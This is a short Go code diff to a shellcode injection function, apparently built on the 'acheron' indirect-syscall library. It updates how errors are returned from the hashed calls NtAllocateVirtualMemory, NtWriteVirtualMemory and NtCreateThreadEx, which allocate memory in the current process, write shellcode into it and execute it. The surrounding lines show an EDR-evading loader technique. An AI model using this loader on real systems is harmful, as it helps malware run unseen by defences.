@@ -15,7 +15,7 @@ func Inject(ach *acheron.Acheron, scBuf []byte) error {
 
 	fmt.Printf("[+] Allocating memory with NtAllocateVirtualMemory ...\n")
 	scBufLen := len(scBuf)
-	if err := ach.Syscall(
+	if _, err := ach.Syscall(
 		ach.HashString("NtAllocateVirtualMemory"),
 		hSelf,
 		uintptr(unsafe.Pointer(&baseAddr)),
@@ -28,7 +28,7 @@ func Inject(ach *acheron.Acheron, scBuf []byte) error {
 	}
 
 	fmt.Printf("[+] Writing shellcode to memory ...\n")
-	if err := ach.Syscall(
+	if _, err := ach.Syscall(
 		ach.HashString("NtWriteVirtualMemory"),
 		hSelf,
 		uintptr(unsafe.Pointer(baseAddr)),
@@ -40,7 +40,7 @@ func Inject(ach *acheron.Acheron, scBuf []byte) error {
 	}
 
 	fmt.Printf("[+] Creating thread with NtCreateThreadEx ...\n")
-	if err := ach.Syscall(
+	if _, err := ach.Syscall(
 		ach.HashString("NtCreateThreadEx"),
 		uintptr(unsafe.Pointer(&hThread)),
 		windows.GENERIC_EXECUTE,
